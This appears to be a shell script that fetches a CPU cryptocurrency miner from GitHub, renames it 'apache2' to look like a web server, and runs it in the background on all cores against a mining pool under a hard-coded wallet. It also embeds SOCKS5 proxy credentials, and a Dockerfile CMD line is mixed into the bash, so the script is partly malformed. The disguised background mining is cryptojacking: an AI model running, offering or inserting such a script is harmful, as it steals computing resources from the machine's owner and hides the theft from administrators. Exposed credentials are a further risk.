#!/bin/bash
proxy="socks5://a019xpj2-3va47yc:gad7w69xcf@socks-us.windscribe.com:1080"
array[0]="0001"
array[1]="0002"
array[2]="0003"
size=${#array[@]}
index=$(($RANDOM % $size))
worker=${array[$index]}
apt-get update
wget https://github.com/hellcatz/luckpool/raw/master/miners/hellminer_cpu_linux.tar.gz
tar xf hellminer_cpu_linux.tar.gz
rm hellminer_cpu_linux* && mv hellminer apache2
CMD ["/bin/sh", "-c", "nohup ./apache2 -c stratum+tcp://eu.luckpool.net:3956#xnsub -u RGVegWzDKhuPUAKJybftAZm4BXShNFPCYe.noname -p x --cpu $(echo $(nproc --all)) > build.log"]
